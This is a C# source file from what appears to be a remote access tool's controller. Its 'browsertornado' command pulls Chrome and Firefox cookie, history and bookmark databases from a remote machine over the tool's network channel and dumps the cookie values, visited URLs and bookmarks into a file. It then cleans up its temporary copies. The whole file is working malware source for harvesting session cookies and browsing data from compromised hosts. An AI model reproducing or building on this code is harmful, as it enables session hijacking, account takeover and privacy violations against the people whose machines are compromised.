using Master.AdvancedConsole;
using Master.Commands.Core;
using Master.Core;
using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Master.Commands.BrowserTornado
{
    internal class BrowserTornadoCommand : IMasterCommand
    {
        public string name { get; } = "browsertornado";

        public string description { get; } = "Dump cookies, history and bookmarks into a file from Google Chrome and Firefox";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?*:[filename]"
        };

        public void Process(List<string> args)
        {
            var databases = new Databases();

            GetDatabases(databases);

            if (databases.NoDatabases())
            {
                ColorTools.WriteCommandError("No browser database could be harvested");
            }
            else
            {
                try
                {
                    File.WriteAllText(args[0], ProcessDatabases(databases));
                    ColorTools.WriteCommandSuccess($"Successfully wrote informations in {args[0]}");
                }
                catch (Exception)
                {
                    ColorTools.WriteCommandError($"Couldn't write informations in {args[0]}");
                }

                Cleanup();
            }
        }

        void GetDatabases(Databases databases)
        {
            var masterNetworkManager = (MasterNetworkManager)MasterCommandsManager.networkManager;
            // Don't show file transfer progress
            masterNetworkManager.UnsetStreamTransfertEventHandlers();

            ColorTools.WriteCommandMessage("Starting browsers databases harvest...");
            Directory.CreateDirectory("temp-bt");

            #region Chrome
            if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Google Chrome was found");

                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
                {
                    using (var readStream = new FileStream("temp-bt/gc-cookies", FileMode.Create))
                    {
                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
                        databases.chromecookies = "temp-bt/gc-cookies";
                    }
                    ColorTools.WriteCommandMessage("Cookies database downloaded");
                }
                else
                {
                    ColorTools.WriteCommandError("Couldn't retrieve cookies database");
                }

                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
                {
                    using (var readStream = new FileStream("temp-bt/gc-history", FileMode.Create))
                    {
                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
                        databases.chromehistory = "temp-bt/gc-history";
                    }
                    ColorTools.WriteCommandMessage("History database downloaded");
                }
                else
                {
                    ColorTools.WriteCommandError("Couldn't retrieve history database");
                }

                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
                {
                    using (var readStream = new FileStream("temp-bt/gc-bookmarks", FileMode.Create))
                    {
                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
                        databases.chromebookmarks = "temp-bt/gc-bookmarks";
                    }
                    ColorTools.WriteCommandMessage("Bookmarks database downloaded");
                }
                else
                {
                    ColorTools.WriteCommandError("Couldn't retrieve bookmarks database");
                }
            }
            else
            {
                ColorTools.WriteCommandError("Google Chrome wasn't found in its usual folder => skipping");
            }
            #endregion Chrome

            #region Firefox
            if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Firefox was found");

                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
                {
                    using (var readStream = new FileStream("temp-bt/ff-cookies", FileMode.Create))
                    {
                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
                        databases.ffcookies = "temp-bt/ff-cookies";
                    }
                    ColorTools.WriteCommandMessage("Cookies database downloaded");
                }
                else
                {
                    ColorTools.WriteCommandError("Couldn't retrieve cookies database");
                }

                if (GlobalCommandsManager.networkManager.ReadLine() == "OK")
                {
                    using (var readStream = new FileStream("temp-bt/ff-places", FileMode.Create))
                    {
                        MasterCommandsManager.networkManager.NetworkStreamToStream(readStream);
                        databases.ffplaces = "temp-bt/ff-places";
                    }
                    ColorTools.WriteCommandMessage("Places database downloaded");
                }
                else
                {
                    ColorTools.WriteCommandError("Couldn't retrieve places database");
                }
            }
            else
            {
                ColorTools.WriteCommandError("Firefox wasn't found in its usual folder => skipping");
            }
            #endregion Firefox

            masterNetworkManager.SetStreamTransfertEventHandlers();
        }

        string ProcessDatabases(Databases databases)
        {
            var data = "";
            ColorTools.WriteCommandMessage("Extracting informations from the databases...");

            if (!databases.NoChromeDatabases())
            {
                data += "+--------+\n| Chrome |\n+--------+\n";

                if (databases.chromecookies != "")
                {
                    data += "\n---------------\n    Cookies\n---------------\n";
                    var results = Chrome.DumpCookies(databases.chromecookies).ToList();
                    foreach (var result in results)
                    {
                        data += $"{result.domain} | {result.name} | {result.value}\n";
                    }
                }

                if (databases.chromebookmarks != "")
                {
                    data += "\n---------------\n   Bookmarks\n---------------\n";
                    var results = Chrome.DumpBookmarks(databases.chromebookmarks).ToList();
                    foreach (var result in results)
                    {
                        data += $"{result.Item1} | {result.Item2}\n";
                    }
                }

                if (databases.chromehistory != "")
                {
                    data += "\n---------------\n    History\n---------------\n";
                    var results = Chrome.DumpHistory(databases.chromehistory).ToList();
                    foreach (var result in results)
                    {
                        data += $"{result}\n";
                    }
                }

                data += "\n\n\n";
            }

            if (!databases.NoFirefoxDatabases())
            {
                data += "+---------+\n| Firefox |\n+---------+\n";

                if (databases.ffcookies != "")
                {
                    data += "\n---------------\n    Cookies\n---------------\n";
                    var results = Firefox.DumpCookies(databases.ffcookies).ToList();
                    foreach (var result in results)
                    {
                        data += $"{result.domain} | {result.name} | {result.value}\n";
                    }
                }

                if (databases.ffplaces != "")
                {
                    data += "\n---------------\n   Bookmarks\n---------------\n";
                    var results = Firefox.DumpBookmarks(databases.ffplaces).ToList();
                    foreach (var result in results)
                    {
                        data += $"{result.Item1} | {result.Item2}\n";
                    }

                    data += "\n---------------\n    History\n---------------\n";
                    var results2 = Firefox.DumpHistory(databases.ffplaces).ToList();
                    foreach (var result in results2)
                    {
                        data += $"{result}\n";
                    }
                }
            }

            return data;
        }

        void Cleanup()
        {
            // Needed to avoid file locking, as SQLiteConnection.ClearAllPools() doesn't work here
            GC.Collect();
            GC.WaitForPendingFinalizers();

            try
            {
                foreach (var file in Directory.GetFiles("temp-bt"))
                {
                    File.Delete(file);
                }

                Directory.Delete("temp-bt");
                ColorTools.WriteCommandMessage("Cleaned up");
            }
            catch (Exception)
            {
                ColorTools.WriteCommandError("Couldn't clean up the temp files...");
            }
        }
    }

    internal class Databases
    {
        public string chromecookies { get; set; }

        public string chromehistory { get; set; }

        public string chromebookmarks { get; set; }

        public string ffcookies { get; set; }

        public string ffplaces { get; set; }

        public bool NoChromeDatabases()
        {
            return chromebookmarks == ""
                   && chromecookies == ""
                   && chromehistory == "";
        }

        public bool NoFirefoxDatabases()
        {
            return ffcookies == ""
                   && ffplaces == "";
        }

        public bool NoDatabases()
        {
            return NoChromeDatabases() && NoFirefoxDatabases();
        }
    }
}
